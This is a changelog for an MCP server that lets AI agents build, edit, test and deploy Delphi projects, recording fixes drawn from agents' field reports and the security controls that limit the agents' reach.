# Changelog

All notable changes to this project are documented here. The format follows
[Keep a Changelog](https://keepachangelog.com/) and the project adheres to
[Semantic Versioning](https://semver.org/): MAJOR.MINOR.PATCH, where MINOR
adds tools/capabilities and PATCH fixes. The server reports its version in
the MCP `initialize` response (`serverInfo.version`).

## [Unreleased]

## [0.61.0-beta] - 2026-08-25

The other half of round 8: what the agents asked FOR, rather than what they
found broken.

### Added
- **`delphi_help`** - the map an agent arriving cold does not have. An agent
  said it plainly after doing a real job through nothing but this server:
  "no hay forma de preguntarle al servidor como se usa". `command=tasks`
  (the default) is the task -> tool table, one line each; `command=tool
  name=<tool>` is ONE tool in full without asking for `tools/list` (which
  returns all 41 at once, about 14k tokens); `command=conventions` is the
  ten rules that hold for every tool - virtual drives, the jail, anchored
  editing, the backups, encodings, compile-is-not-works, and that anything
  impossible through MCP is itself a finding worth reporting.
- **`delphi_changeset commit` says what it changed**, file by file with the
  line delta, the way `delphi_edit` always has. Two numbers after a
  16-operation batch left nobody able to tell WHICH files moved.
- **`delphi_projects` reports the git repository and the branch** each
  project sits in (read straight from `.git/HEAD`, no git process). An agent
  needs to know whether what it is about to edit is under version control,
  and on which branch, BEFORE it edits.
- **`delphi_build` names the FIRST error** (`firstError`) and says the rest
  may be its shadow. Measured in the field: one E2009 - a plain procedure
  assigned to a `TNotifyEvent` - produced seven E2250 "no overloaded version
  of Synchronize/Queue" in the same file, and the pile read like a threading
  problem it was not.

### Fixed
- **The mailbox notice broke JSON.** It was appended behind the answer, so
  while a message sat waiting, every JSON-returning tool answered something
  `json.loads()` could not parse - a syntax error out of nowhere, and only
  while there was mail. It now goes INSIDE the object as a `mailbox` field;
  only prose answers get it appended.
- `delphi_help` with a name that matches nothing lists every tool and says
  so, instead of claiming they all "look like" what was asked.


## [0.60.0-beta] - 2026-08-25

Field round 8. Three agents worked the server through nothing but MCP (a
security auditor, a contract prober, and one doing a real programming job)
and came back with 30+ findings. This release is those findings, fixed. New
battery `tests/test_round8.py` (57 checks) pins every one of them.

### Fixed - data loss and leaks
- **`delphi_upload` with no `chunkbase64` truncated an existing file to 0
  bytes and reported success.** The schema only demanded `path`, so a
  half-typed call opened the target with `fmCreate` and emptied it. Now
  refused, with the current size named. An upload that legitimately REPLACES
  a file now says so (`replaced`, `previousSize`) and where the recoverable
  copy is (`backup`) - the copy was already being made, and saying nothing
  about it is why an auditor concluded there was none.
- **An upload whose `sha256` did not match stayed published under its real
  name.** The bytes are known to be wrong: they are moved aside to
  `<file>.corrupto` and the answer says where.
- **The real drive letter leaked in every multi-line field.** By the time
  the mask runs the text is JSON, where a line break is the two characters
  `\` and `n` - so the letter `n` looked like the end of a word and the
  guard let `C:\Program Files...` through untouched. Single-line fields
  masked fine, which is why it survived this long: `errors[]` was virtual
  and `outputTail` was not.

### Fixed - answers that were not true
- **`delphi_config view` on a bare `.dpr`** answered with an empty
  framework, no platforms, no configurations and a cheerful
  `crossPlatform: yes`. It now resolves the sibling `.dproj` when there is
  one, and when there is not it returns the units it CAN read plus
  `hasDproj: false` and what it cannot know.
- **`$(BDS)` and friends never resolved** although the schema promised them:
  the search-path validator was reading the IDE's registry key instead of
  the full macro table, so the refusal recommended exactly what it had just
  refused.
- **`delphi_designer prop`** now gives the members of a **set**, not only of
  an enum, as its description always claimed.
- **`delphi_designer lint`** names the classes it does not know (it stayed
  silent, which read as "checked and fine") and no longer denounces
  `Viewport.*` or `Explicit*` - properties the IDE itself writes that
  classic RTTI never lists. Five false positives on real `.fmx` forms were
  telling agents to delete good properties.
- **`delphi_fetch`'s `maxbytes`** documented a cap of 8 MB while anything
  over 4 MB came back as a link with no inline chunk; the parameter now
  describes the real rule and the answer carries `inline: false`.
- **`vault_read`'s footer** said "lines 1..N" whatever the offset was, so a
  reader asking for 20..21 was told it had seen 1..21 and stopped asking.
  An offset past the end is now explained instead of answering with a bare
  header.
- The `target=Deploy` both `add-deployfile` and `view` recommended needs an
  IDE connection profile and fails with "Missing profile name" without one,
  Win32 included. Said plainly now, pointing at `delphi_paclient`.

### Fixed - dangerous or dead ends
- **`delphi_create` is atomic.** A collision on the third file left an
  orphan `.dpr` pointing at another project's unit, with no `.dproj`, and
  the retry refused with "ya existe un proyecto": a dead end. Every target
  is checked before anything is written.
- **Unit names**: reserved words (`begin` - E2029 plus 16 cascading errors)
  and RTL unit names (`System` - hijacks the compiler's own) are refused
  with the reason.
- **A form of the wrong framework** is refused instead of landing an FMX
  form and its `Application.CreateForm` in a `.dpr` that uses `Vcl.Forms`.
- **`delphi_styles set`** validates the value against the streaming grammar
  instead of writing anything at all and leaving the `.style` unreadable
  until `build` failed. `prop=StyleName` is a rename: refused when the name
  is taken (it was silently producing duplicates), announced as a rename
  when clean.
- **`remove-platform`** is idempotent (it was taking a backup of a no-op)
  and refuses to disable the last enabled platform.
- **A missing required parameter** is a refusal with the parameter's name,
  not `Error executing tool: Invalid characters in path`.

### Added
- **`delphi_changeset` validates against the BATCH, not just the disk.**
  Staging `delete X` + `create X` - the natural way to rewrite a unit - was
  refused because the delete had not run yet. A changeset is a plan, so the
  plan decides.
- **`delphi_changeset command=unstage`** (`n` = the number `preview` prints,
  0 = the last one): one mistyped anchor no longer means rolling the whole
  batch back and staging it all again.
- **`delphi_create kind=unit content=...`** creates the unit WITH its source
  and registers it in one call. The `unit X;` must match the file name and
  it must end in `end.` - registering `UFoo.pas` whose source says
  `unit UBar` is a lie the compiler finds much later.
- The mailbox notice **no longer names another agent's box**. Three agents
  reported reading `MENSAJES PENDIENTES (buzon: dsh)` on nearly every
  answer, being unable to do anything about it, and learning another id for
  free. Mail for everyone is announced as theirs; mail for a named agent is
  counted, never named.
- `delphi_build` finds the `lib<Project>.so` Android and iOS actually
  produce, so `output` is no longer absent on those platforms.
- `vault_search` refuses a `target` it does not know instead of silently
  falling back to `files` (`target=contents` answered with note NAMES and
  the caller concluded the vault was empty inside).


## [0.59.0-beta] - 2026-08-25

The biggest wall left, named independently by both reviews: an agent could
write code and never learn whether it WORKS.

### Added
- **`delphi_test`** - `discover path=<folder>` lists the test projects
  underneath (a `.dpr` using DUnitX, or a console one whose name says
  test/spec); `run project=<test .dproj>` builds it and runs it, answering
  **structured**: total / passed / failed, the failing lines, exitCode,
  duration and a bounded tail. Two dialects understood (DUnitX's summary and
  the plain PASS/FAIL + ExitCode of a hand-written runner), and the verdict
  says which one spoke (`verdictFrom`) instead of guessing. A suite that does
  not compile answers `build-failed` with the compiler errors - it never runs
  a stale binary.
- **`[Security] AllowTests`** (env `DELPHI_MCP_ALLOW_TESTS`) - its own
  switch, separate from `AllowRun` on purpose: allowing a test suite to run
  is a narrower decision than allowing arbitrary binaries (`AllowRun` implies
  it). The binary is built here, comes from a project of the jail and runs in
  the same low-integrity sandbox with a timeout. `discover` works without it.
- `tests/test_delphi_test.py` (19 checks): a green suite and a red one, the
  switch refusing `run` while `discover` still answers, a non-test project
  refused, and a suite that does not compile.


## [0.58.0-beta] - 2026-08-25

Four fixes from a full session run by an agent that worked ONLY through the
MCP (72 calls, no local filesystem, no shell) - the dogfooding the review
asked for, done properly.

### Fixed
- **`delphi_rename_symbol` left the definition out of `changes`** - and
  `changes` is the contract an agent stages. The implementation header (the
  very line the `definition` field points at) is not a "reference", so it
  never came in the list: applying exactly what the tool listed broke the
  unit with `E2065 Unsatisfied forward declaration`. The agent measured it,
  it was not a guess. Now the definition line is always there (with its
  text and `kind: definition`), plus a warning when the header is qualified
  (`TClass.Method`), where only the method half may change.
- **Every tool advertised ALL its parameters as `required`** (a vendor
  default: required unless marked `[Optional]`, and nothing was). The server
  happily accepts partial calls, so the schema was lying - and a client that
  validates before sending could not call anything. Inverted (`[Required]`
  marks the few that are), and marked across the 39 tools.
- **`delphi_search` returned the line trimmed and no column**, so the hit
  could not be turned into a `line:character` for the LSP tools without an
  extra `delphi_read` just to count spaces. Now the text is verbatim and the
  hit carries `line0`/`character0` ready to chain.
- **The LSP family spoke two dialects**: `definition` answered a
  `file:///srvd%3A/...` URL with 0-based lines while `hover` printed 1-based
  ones. Every location now also carries `path` (the format the rest of the
  server uses) and `line1` next to the LSP `line`.


## [0.57.0-beta] - 2026-08-25

First fix out of the deep review (`docs/REVIEW-2026-08.md`): an agent could
CREATE a branch and never move to it, so it could not work the way a
programmer does - branch per task, commit, back to main.

### Added
- **`delphi_git switch`** (`args=<branch>`, `create=true` for a new one),
  **`merge`** (always `--ff-only`: a merge that would need a commit, or
  conflict, is REFUSED rather than left half-done - that is a person's call)
  and **`stash`** (`push`/`pop`/`list`; `drop` deliberately absent, it
  destroys). The file-restoring forms of `checkout` stay out: discarding
  work needs its own command with its own words, not a flag.
- `tests/test_git_branches.py` (15 checks): branch per task, work, switch
  back, ff-only merge, a divergent merge refused, stash round-trip.


## [0.56.0-beta] - 2026-08-25

Remote execution CLOSED end to end: an agent with no route to the target
machine started the runner there and ran the app it had deployed, all
through MCP. Measured against the real Zorin box, not a stub.

### Added
- **`delphi_paserver command=start-runner`** - starts the runner on the
  target, no shell needed there. The discovery that makes it possible:
  paclient's `--put` FLAGS are not permissions, they are actions - flag 5
  makes PAServer EXECUTE the file with `/bin/sh` on the target and flag 3
  executes it directly. So the server sends a small POSIX launcher (LF, no
  BOM) that starts the runner with `setsid` (surviving PAServer's cleanup)
  and reports what it saw. Gated by `AllowRemoteRun` exactly like remote-run:
  starting the runner IS enabling execution.

### Fixed
- **`install-runner` shipped the runner with flag 5**, so PAServer tried to
  run a Python file through `/bin/sh` and the copy did not stay. Now flag 0
  (plain data).
- **`remote-run` doubled the `<user>-<profile>` segment**: the runner lives
  in `<scratch>/<user>-<profile>/_mcp-runner`, so ITS root already IS the
  profile folder and the path must be just `<Project>/<Project>`. The test
  battery had encoded the same wrong assumption; fixture corrected against
  the real layout.


## [0.55.0-beta] - 2026-08-25

### Fixed
- **An `Mcp-Session-Id` this process never issued is now refused with 404**
  (`[local change]` in the vendored HTTP server, which echoed whatever the
  client sent and never checked it). Reported by an agent that had just
  taught its client to PERSIST the session: after a server restart the
  stored id is dead, and silently accepting it leaves the client working
  against a ghost. An `initialize` carrying a stale id still passes - that
  request IS the fix. Auth was never affected (the Bearer token decides
  everything); this is protocol correctness, and it is what lets a
  persistent-session client detect a restart.


## [0.54.0-beta] - 2026-08-24

Four field frictions from an agent using the new tools on a real change (16
edits over 2 files of a live FMX project).

### Fixed
- **`delphi_changeset commit` reported "0 operaciones aplicadas" having
  applied 16**: the owning dictionary FREES the changeset on `Remove`, and
  the message read `C.Ops.Count` afterwards. Counts are captured before.
  Same root cause as the "fallo la operacion 2 de 0" in rollbacks.
- **`atline` is now rebased against what earlier operations of the same
  changeset did to that file**: the preview resolves against the original
  text and the commit applies against the mutated one, so a batch that
  ADDED lines broke the pinned line of a later operation.
- **`delphi_designer lint` no longer warns about `Left`/`Top`** of
  non-visual components: the form designer writes them in every form
  carrying a TImageList/TPopupMenu and no class publishes them (6 of 6
  warnings on a real form were this).

### Added
- **`delphi_changeset kind=delete-line`** (`atline` required, `old`
  optional) - the only way to remove a BLANK line, which has no usable
  anchor; exactly what a cleanup leaves behind. `kind=delete` keeps meaning
  the WHOLE FILE, now said so in the schema.
- Changeset edits on NON-Delphi files (`.md`, `.json`, `.ini`...) now go
  through the plain-text engine instead of being refused: a transaction that
  could not touch a doc next to the code was half a transaction.


## [0.53.2-beta] - 2026-08-24

### Fixed
- `delphi_rename_symbol`: the `changes` list is capped at 100 entries with
  `changesTruncated` (a symbol with hundreds of uses must not flood a small
  client's context; `occurrences`/`files` carry the full truth).


## [0.53.1-beta] - 2026-08-24

### Fixed
- **`delphi_workspace` cost every session ~3.5k tokens**: `readableExtra`
  listed the ~145 registered library folders one by one, on the call every
  agent makes FIRST. Compressed to the unique top-level trees with a
  subfolder counter (measured while hunting what filled a local model's
  context; the other thief is the tools/list catalog itself - ~14k tokens
  per reconnect - so the operator's deploy policy is now batch-and-notify
  instead of one reconnect per version).


## [0.53.0-beta] - 2026-08-24

Semantic rename, PREVIEW ONLY - the refactoring DelphiLSP 37 does not
provide, built from the pieces this server already trusts, with a rule
strict on purpose.

### Added
- **`delphi_rename_symbol`** (path + 0-based line/character + `newname`,
  `mode=preview`) - lists every CONFIRMED occurrence (each one re-resolved
  against the same definition), the files touched, and whether the rename is
  APPLICABLE. One single unverified reference, a hit in a `.dfm`/`.fmx`
  (form bindings), a hit inside a string literal (FindComponent/RTTI/
  StyleLookup by name), a definition outside the workspace (RTL/components),
  a reserved word or a collision with the new name = `applicable=false` with
  the reasons. `mode=apply` is refused for now: it will arrive over
  `delphi_changeset` once preview is field-validated; meanwhile an
  applicable preview IS the change list to stage there yourself.
- `tests/test_rename.py` (12 checks): the acceptance criteria as tests,
  including "the tool never writes".

### Fixed
- The string-literal scan is a LINEAR walk: the obvious `'(...|'')*'` regex
  backtracked catastrophically on a 1 MB RTL unit (stack overflow, found by
  the battery's own RTL case). A definition outside the jail is never
  scanned further at all.


## [0.52.0-beta] - 2026-08-24

The designer, structured (phase 1: read + lint) - the roadmap step ahead of
rename, on the generated RTTI tables the post-edit lint already used.

### Added
- **`delphi_designer`** - `info class=TButton` (every property the framework
  REALLY publishes, kind and type, events apart; `filter` narrows), `prop
  class=TPanel prop=Align` (one property in detail, with the legal enum/set
  members and the runtime class of class-typed properties), `tree
  path=<.dfm|.fmx>` (the component tree: name, class, line), `get ...
  component=<Name>` (that component's block verbatim), `lint path=...` (the
  designer lint on demand: properties the class does not publish, enum
  values that do not exist; an UNKNOWN class is deliberately not a warning -
  third-party components are not in the tables and are legitimate). Binary
  TPF0 designers refused, as everywhere. Editing commands are phase 2 and
  will go through `delphi_changeset`.
- `tests/test_designer.py` (20 checks).


## [0.51.0-beta] - 2026-08-24

Multi-file transactions - the foundation piece of the adopted roadmap
(changeset -> designer -> rename), and the close of a real debt: the project
tools could only REPORT a partial change when one file of a batch failed.

### Added
- **`delphi_changeset`** - `begin` -> `stage` (edit/create/delete/move, one
  per call, nothing touches disk) -> `preview` (resolves every anchor and
  fingerprints every file the batch will touch, SHA-256) -> `commit`
  (fingerprints re-checked: a file changed since preview refuses the WHOLE
  batch; byte snapshots first, then apply in order; ANY failure restores
  every file byte-exact and names the failing operation). `rollback`
  discards; `status` lists. Edits use the delphi_edit contract. Changesets
  expire after 30 minutes unused; at most 8 open.
- `tests/test_changeset.py` (22 checks) - the external review's acceptance
  criteria as tests: batch of 10 with a failure at op 7 -> ZERO net changes;
  FILE_CHANGED between preview and commit -> refused untouched; CP1252+CRLF
  intact; commit without a clean preview blocked.


## [0.50.0] - 2026-08-24 (docs/tests only, no server change)

Doc hygiene, from an external technical review that caught the README still
claiming 29/28 tools while the server registers 36.

### Fixed
- README counts corrected (36 tools, 31 core, 24 non-LSP core) and the
  non-LSP tool list completed (`delphi_components`, `delphi_styles`,
  `delphi_messages` were missing).

### Added
- **`docs/CAPABILITIES.json`** - capability manifest generated from the LIVE
  `tools/list` by `scripts/gen-capabilities.py` (run it after each release).
- **`tests/test_docs_consistency.py`** (16 checks) - every figure the README
  claims, every `### tool` section of TOOLS.md and the manifest are compared
  against the real `tools/list`; drift is now a test failure. It already
  caught its own first bug: with a read-only vault only 2 of the 5 vault
  tools register, so the full-surface run needs the vault writable.


## [0.49.0-beta] - 2026-08-24

Two scope controls, both from an agent's security review of its own reach.

### Added
- **`[Security] RemoteRunProjects`** - semicolon list of project names (or
  full `.dproj` paths) `remote-run` may execute on a target. Empty (the
  default) keeps the current behaviour, any project of the jail; with several
  projects of different trust it stops an agent working on A from running the
  deployed binary of B.
- **`[Security] LibraryZone`** (env `DELPHI_MCP_LIBRARY_ZONE`) - `0` cuts the
  read-only library zone: reads are then confined to the workspace roots,
  exactly like writes. Default `1` (reading the RTL and the installed
  components is what lets an agent check an API instead of guessing), but the
  zone GROWS by itself with every component or SDK installed, so the operator
  now has a way to say no. `delphi_workspace` announces the off state and
  returns an empty `readableExtra`.


## [0.48.1-beta] - 2026-08-24

### Added
- **`[Security] AllowRemoteRun`** (env `DELPHI_MCP_ALLOW_REMOTE_RUN`) - the
  operator's switch for `remote-run`, OFF by default and INDEPENDENT of
  `AllowRun`: running on a target is not running here, and whoever runs this
  server does not necessarily own that machine. Two locks in series now: this
  switch on the server side, and the runner somebody has to launch on the
  target. `install-runner` does not need it - copying a script executes
  nothing. Documented in `settings.example.ini`.


## [0.48.0-beta] - 2026-08-24

### Changed - BREAKING (remote-run, one day old)
- **`remote-run` no longer takes a remote path: it takes the PROJECT.** The
  rule is now "the only thing that runs on the target is the program that
  project deployed" (operator's call): the server derives
  `<user>-<profile>/<Project>/<Project>` itself, so nothing else of the
  remote machine - not even another file of the scratch dir - is reachable.
  `exe` survives as an OPTIONAL plain file name of that same deploy folder
  (no separators, no `..`) for a deploy with more than one binary.
- **The runner enforces the same rule on its side**: the job carries the
  allowed folder and the runner refuses anything resolving outside it
  (symlinks included), and refuses anything that is not a NATIVE executable
  (ELF / Mach-O / PE magic) - a script would turn "run the deployed program"
  into "run any interpreter with any arguments".
- `tests/test_remoterun.py`: 15 checks (script of the same folder refused,
  path separators refused, project outside the jail refused).


## [0.47.2-beta] - 2026-08-24

### Fixed
- **`remote-run` said "no runner installed" when the runner WAS installed and
  simply not launched** (reported by an agent that had just run
  `install-runner`). On the timeout path the server now asks the target
  whether the script is there and answers accordingly, with the launch line;
  the result carries `runnerInstalled` so the two cases are told apart.


## [0.47.1-beta] - 2026-08-24

### Added
- **`delphi_paserver command=install-runner name=<profile>`** - copies
  `runner/mcp-runner.py` to the target's `_mcp-runner/` through paclient, and
  answers with the single line to launch it there. Field 2026-08-24: the
  agent that needs `remote-run` (a container with no route to the target) has
  no other way to put the file on that machine; installing it by hand was
  never going to be its job.


## [0.47.0-beta] - 2026-08-24

Remote RUN: an agent that is not sitting on the target machine can now
execute what it just deployed there.

### Added
- **`delphi_paserver command=remote-run`** - runs a program on the machine
  of a PAServer profile and returns its exit code and output. `paclient.exe`
  has no exec operation (its whole surface is file copy, codesign and
  Android packaging - launching processes is the IDE<->PAServer private
  protocol), so the run travels as a job file: the server `--put`s the order
  in `<scratch>/_mcp-runner/jobs/`, the target's runner executes it and
  writes the result, the server `--get`s it. Parameters: `name` (profile),
  `exe` (relative to the scratch dir or absolute), `args`, `timeoutms`.
- **`runner/mcp-runner.py`** - the target half, installed once inside
  PAServer's scratch dir. It is the OPT-IN: no runner, no remote execution
  (the call times out saying exactly that). It only executes binaries inside
  the scratch dir - the deploy zone - never the rest of the machine.
- `tests/test_remoterun.py` (7 checks) with `tests/paclient_stub.py`: the
  whole cycle without a real PAServer.


## [0.46.3-beta] - 2026-08-24

A 5-probes-per-tool sweep over all 36 tools (180 probes): four fixes.

### Fixed
- **`delphi_projects` ignored the environment jail**: it re-read
  `settings.ini` itself, so a server jailed via `DELPHI_MCP_ROOTS` answered
  "no workspace roots configured" while every other tool was correctly
  confined. It now asks the jail (one source of truth).
- **`delphi_read` swallowed binaries**: an `.exe` came back as 9 MB of
  CP1252 mojibake. A NUL byte in the first 4 KB now refuses with a pointer
  to `delphi_fetch`.
- **`git commit` in a fresh repo** died with "Author identity unknown"
  (exit 128) and no way out: the answer now names the whitelisted fix
  (`command=config args=user.name/user.email`).
- `vault_read linecount` accepted as alias of `limit`.


## [0.46.2-beta] - 2026-08-23

Two bugs found by working a real project through the MCP alone.

### Fixed
- **`add-unit` / `remove-unit` re-indented the whole `uses` clause of the
  `.dpr`** to four spaces (the indent was applied twice): a 40-line cosmetic
  diff on every registration. The clause keeps the indent it already had.
- **`delphi_references` never scanned sibling folders**: units living next to
  the project folder (`SharedSource\` beside `codigofuente\`) were not
  walked, so a symbol used twice in its own file reported zero references.
  The scan now covers the project folder, the file's own folder and the
  folder of every unit the `.dpr` lists (inside the read zone).


## [0.46.1-beta] - 2026-08-23

The rest of the agent-side frictions.

### Added
- **Parameter aliases at the gate** - the same idea was spelled `query` /
  `pattern` / `filter` across tools and each spelling learned on one tool
  cost an "Unknown parameter" on the next. Accepted now, only where the tool
  does not already declare the name with another meaning: `vault_search
  query|filter` → `pattern`, `delphi_list filter|mask` → `pattern`,
  `delphi_components pattern|query` → `filter`, `delphi_read
  startline|endline` → `fromline|toline`, `delphi_search text` → `query`.
  The declared name always wins; an alias sent next to it is dropped.
- **`delphi_search root=<file>`** - one file (a `.dproj`, `.dpr`, `.inc`,
  `.xml`) is searched in a single call; a 1900-line `.dproj` used to cost
  five `delphi_read` calls.
- **`delphi_list` refuses `{a,b}`** with the `;` alternative instead of
  returning an empty list.
- **Tray: `logsctual.log`** - the live tail of the block not yet
  persisted (the memo reaches a file every `LinesPerFile` lines; a server
  stopped from outside lost hours of log). Removed when the block is saved.

### Fixed
- Vault backups: one folder per WORK session (a new stamp after 4 h without
  writes), not per server run - a tray lives for days.
- Vendor logger flushes per line when file logging is on.


## [0.46.0-beta] - 2026-08-23

Seven frictions measured in one sitting by running the agent's closing
tasks with nothing but the MCP (and the agent's own reports), fixed where
the fix was clear.

### Fixed
- **`delphi_styles lint` read comments**: a `StyleLookup` mentioned in a
  `//`, `{ }` or `(* *)` comment of a `.pas` became a "lookup without
  style" (a documented non-issue of a real project was reported as a
  finding). Comments and directives are now blanked before scanning.
- **Non-Windows builds declared no `output`**: a Linux64 build leaves an ELF
  without extension (macOS too); `delphi_build` now declares it (plus `.so`
  / `.dylib`), as it already did for `.exe`/`.dll`/`.bpl`.
- **`initialize` over SSE omitted the `Mcp-Session-Id` header** (the id was
  only in `result.sessionId`); a client strict with the streamable-HTTP
  spec found no session. The header is emitted on both paths now.

### Added
- **`delphi_styles command=delete`** - removes a whole style by StyleName
  (the `__delphi-patch` copy is the way back). Cleaning a test clone used
  to take a `delphi_delete` of the file plus a `delphi_move` of the backup.
- **`deployNote` warns that the PAServer scratch folder is rewritten** on
  every deploy - whatever the app stored next to its binary (data folder,
  local database, key file) goes with it.
- **`vault_search` with no hits on names** now says it only looked at note
  names and points at `target=content`.


## [0.45.0-beta] - 2026-08-23

The "new platform" loop, closed from the agent's own report: a Linux64
build of a fat FMX app took two failed builds per component to locate the
Source folders that only Windows had registered.

### Added
- **`delphi_build` → `missingUnits`** - when a build fails with F2613
  (`Unit 'X' not found`) or F1026, the result names each missing unit and
  the folders of the library zone (RAD Studio installs, registered
  components, GetIt catalog) where its `.pas` lives, shortest first, plus
  the `delphi_config add-searchpath` to run. No candidates = the component
  is not installed or brings no source for that platform.
- **`delphi_components platform=X`** - the IDE's Library Search Path for
  ONE platform, expanded to real folders, and the component install roots
  the other platforms register that this one does not (with who has them):
  the matrix to walk before porting a project to Linux64/Android/macOS.


## [0.44.0-beta] - 2026-08-23

The way back of `delphi_report`.

### Added
- **`delphi_messages`** - the operator's mailbox. A Markdown file dropped
  in `messages\<agent>\` (one agent, the id it gives `delphi_report`) or in
  `messages\` (everyone) next to the server exe is delivered by
  `command=read` once (moved to `messages\_entregados\`); `check` lists
  what waits. MCP clients have no usable push, so while a message waits
  EVERY tool answer ends with a `MENSAJES PENDIENTES` line. A broadcast is
  consumed by the first agent that reads it: with several agents, drop one
  file per agent folder. `scripts\Enviar-Mensaje.ps1` writes one from the
  operator's shell.

## [0.43.1-beta] - 2026-08-23

### Fixed
- `delphi_diagnostics`: after a lint was delivered, an identical second
  call waited forever (the in-progress mark was never cleared).


## [0.43.0-beta] - 2026-08-22

FMX styles as a first-class thing for a remote agent. Measured on a real
pipeline (one text master `.style`, a `Tokens.ini`, an `.rc`, three themes):
the agent could read and line-edit the files but not search them, verify
them, or regenerate the binaries the app embeds.

### Added
- **`delphi_styles`** - `view` (the styles of a text `.style`: StyleName,
  class, lines, parts), `get` (one style or a part of it), `set` (one
  property of a style or of a part, by StyleName - never by line; add,
  change or `delete`), `clone` (a new style from an existing one, the way
  to add a variant), `lint` (duplicated StyleNames, `StyleLookup` values of
  the project's `.fmx`/`.pas` that no style defines - the platform default
  style counts -, design tokens missing in a theme of a `*Tokens.ini`, `.rc`
  entries whose file is missing) and `build` (every text `.style` of the
  folder to `.bin.style`, then the folder's `.rc` to `.res` with brcc32).
  Binary styles are refused for editing. `set`/`clone`/`build` are refused
  in read-only mode. Parser tolerates collections (`<item...end>`) and
  binary blocks.
- **`DelphiStyleConvert.exe`** - a small helper shipped next to the server
  (FMX stays out of the service exe): text<->binary conversion and the
  extraction of the Windows platform default style names (cached once).
- **`delphi_search pattern`** - one file mask (`*.style`, `*.ini`, `*.md`,
  `*.rc`) to search files outside the Delphi set.


## [0.42.3-beta] - 2026-08-22

Field report from the DSH agent: `target=Deploy` to Linux said success and
shipped nothing.

### Fixed
- **IDE manifests with an empty platform group**: the Deployment Manager
  writes `<ItemGroup Condition="'$(Platform)'=='Linux64'"/>` for a platform
  the project was never deployed to from the IDE; msbuild then deploys no
  file and still succeeds. The project output (Debug and Release, Include
  following the project's real `DCC_ExeOutput`) is now added to such a
  group, in the IDE's shape; `deployManifest` says so.
- `deployNote` names the real target folder (`<windows user>-<profile>/`),
  reports `deployedFiles` when the run shipped something, and surfaces the
  `Local file "" not found` manifest warning as `deployWarning`.


## [0.42.2-beta] - 2026-08-22

Field report from the DSH agent: `delphi_diagnostics` timed out on a
714-line unit. Three causes, all measured on that unit (2.2 s now):

### Fixed
- **Units in a sibling folder of the project** (`SharedSource\` next to
  `codigofuente\`) were linted without settings - the `.dproj` lookup only
  walked up the tree - so the LSP never published. The lookup now also
  finds the `.dproj` one level down that references the unit.
- **GetIt packages were missing from the fabricated settings**: the IDE's
  library path entries under `$(BDSCatalogRepository)` were dropped as
  unexpanded macros (LockBox, Abbrevia, ICS... -> `F2063 could not compile
  used unit`). The fabricator now expands the IDE's environment table.
- Fabricated settings carry a generation in the cache name, so a rule
  change invalidates old caches.
- `delphi_diagnostics` answers within 40 s: a slow lint keeps running and
  the next call on the same unchanged file returns its result (the lint is
  no longer restarted on retry).


## [0.42.1-beta] - 2026-08-22

Code review of 0.42.0 (8 angles, 10 confirmed findings), all applied.

### Fixed
- **Jail**: projects found in the unit's parent folder are now vetted with
  the write jail before `delphi_delete`/`delphi_move` touch them; a denied
  project is reported and left alone.
- **Uses-clause parser** understands `//`, `(* *)` and `{ }` comments and
  compiler directives: entries keep their leading `{$IFDEF}`/comment when
  dropped (directives stay balanced), a comma/`;`/apostrophe inside a
  comment no longer splits or ends the clause, and the `uses` keyword is
  looked up after `program X;`, never inside a header comment.
- **Designer kind**: unit-qualified ancestors (`Vcl.Forms.TFrame`) are
  recognised; ancestors declared in the same unit are followed up the chain;
  a base living elsewhere is classified by NAME SUFFIX (`...Frame`,
  `...DataModule`), never by substring (`TMainframeForm` is a form).
- **CreateForm placement**: right before `Application.Run`, like the IDE -
  never after a `CreateForm` that may sit inside a conditional block.
- **Out-of-tree units** get a `..\` relative include (same drive), the
  IDE's form, instead of an absolute path.
- **add-unit on a unit already listed from another path** refreshes the
  existing `<DCCReference>` instead of inserting a second one.
- **remove-unit** drops `CreateForm` by CLASS when the `.pas` is readable;
  the form-variable fallback is used only when the class is unknown.
- **delete/move** report the project and designer changes already applied
  when a later step fails; per-project errors are captured, not fatal.
- `view`/`ProjectsUsingUnit` sweep the `.dproj` once (dictionary) instead
  of one regex pass per unit; the read-only scan skips the `.dproj`.
- ASCII-only rejection text (em-dash removed); scaffold failure message
  names the pair as `X.pas/.dfm`.


## [0.42.0-beta] - 2026-08-22

Project membership, done by the server. Until now the agent could scaffold
a project or a form, but a plain unit was a bare file, a new form never
reached the `.dproj`, and deleting or renaming a unit left its `uses`,
`CreateForm` and `<DCCReference>` orphaned - the agent patched the `.dpr`
by hand. Now the IDE's "Add to project" / "Remove from project" / rename
are one operation, shared by every tool that touches a unit.

### Added
- **`delphi_config add-unit` / `remove-unit`**: register an EXISTING
  `.pas` in the project (uses of the `.dpr` with the `{Form}` /
  `{DM: TDataModule}` / `{Frame: TFrame}` comment, `Application.CreateForm`
  for forms and data modules - never frames -, `<DCCReference>` with
  `Form`/`FormType`/`DesignClass` in the `.dproj`, the IDE's exact shape)
  or take it out again; the file stays on disk. Idempotent. The designer
  kind is read from the `.dfm`/`.fmx` root object and the class ancestor;
  binary designers fall back to the `.pas` declarations. `view` now lists
  `units` (name, file, form, and `dproj:false` when the `.dproj` lags).
- **`delphi_create kind=unit | frame-vcl | frame-fmx | datamodule`**: a
  plain unit, a frame (VCL/FMX) or a data module (its `{%CLASSGROUP}`
  follows the project's framework; the designer is a `.dfm` on both), each
  registered on creation. `form-vcl`/`form-fmx` now write their
  `<DCCReference>` too, so the Project Manager lists them at once.
- **`delphi_delete` of a unit** trashes its `.dfm`/`.fmx` with it and takes
  it out of every project in its folder or the parent folder that lists it.
- **`delphi_move` of a unit** moves the designer pair, rewrites the
  `unit X;` header on a rename, and re-points the projects that list it
  (relative include with backslash, form comment and `DCCReference` kept).

### Changed
- `Lsp.ProjectUnits` is the single place that edits project membership;
  `Lsp.Scaffold` no longer has its own `.dpr` registration code.


## [0.41.0-beta] - 2026-08-22

The second half of the "fat project on Linux" story: compiling was solved
by add-searchpath; RUNNING needs the native library a component loads at
runtime to travel with the binary. OBR for FireMonkey is static on
Android/iOS (that is why the project's manifest never mentioned it) but a
runtime `libzbar.so` on Linux and `.dylib` on macOS - and the manifest
had no Linux64 entries because the app had never been deployed there.

### Added
- **`delphi_config add-deployfile` / `remove-deployfile`**: the IDE's
  Deployment Manager, per platform. Adds a file to the `.deployproj` in
  the IDE's own shape (one ItemGroup per platform, one DeployFile per
  configuration, DeployClass File), generating the standard manifest
  first when the project has none (and its import line in the `.dproj`).
  `remotedir` defaults to the project folder on the target - next to the
  binary - or to the apk's `library\lib\<abi>\` for a `.so` on Android;
  it must be a simple relative folder. The file is vetted like any read
  and must exist. `view` lists the deployment entries per platform.

